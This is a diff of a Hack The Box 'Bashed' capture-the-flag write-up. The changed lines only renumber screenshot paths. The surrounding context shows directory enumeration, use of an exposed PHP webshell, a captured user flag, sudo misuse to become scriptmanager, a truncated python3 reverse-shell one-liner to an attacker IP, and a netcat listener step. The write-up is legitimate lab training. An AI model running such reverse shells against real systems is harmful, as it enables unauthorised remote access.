@@ -2,7 +2,7 @@
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image.png" alt="" width="75"><figcaption><p>hackthebox.com - © HACKTHEBOX</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2).png" alt="" width="75"><figcaption><p>hackthebox.com - © HACKTHEBOX</p></figcaption></figure>
 
 </div>
 
@@ -80,7 +80,7 @@ PORT   STATE SERVICE VERSION
 
 Browsing webserver on port 80 via browser, that contains a web php bash.
 
-<figure><img src="../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>
 
 Analyzing source code we don't found nothing of interesting, than we can discover more info about website using whatweb and do directory enumeration using gobuster.
 
@@ -95,13 +95,13 @@ gobuster dir -u http://bashed.htb -w /usr/share/wordlists/dirb/common.txt
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
 Very good, we've found interisting web dir such as /dev and /uploads, exploring them we can answer at our question.
 
-<figure><img src="../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 /dev
@@ -113,7 +113,7 @@ The /dev directory contains two php webshell, more probably phpbash.min.php is a
 
 In both cases, we immediately observe that the user in use is the same.
 
-<figure><img src="../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 www-data
@@ -125,7 +125,7 @@ www-data
 
 Navigating into file system is more simple discover users home directories and arrexel user's flag.
 
-<figure><img src="../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -139,7 +139,7 @@ b2e6af7c997eba350b6cf95ad88240cb
 
 Using sudo -l we can see that www-data can run all commands on bashed as a user scriptmanager.
 
-<figure><img src="../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 scriptmanager
@@ -151,7 +151,7 @@ Going into root dir / we can launch ls -l and see all permissions regarding dire
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -171,7 +171,7 @@ export RHOST="10.10.14.6";export RPORT=1339;python3 -c 'import sys,socket,os,pty
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -187,7 +187,7 @@ Now, we've permissions access to /scripts dir, where we found two files:
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
@@ -219,7 +219,7 @@ Immediately before or at least within two minutes we listen with netcat on the a
 
 <div align="left">
 
-<figure><img src="../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
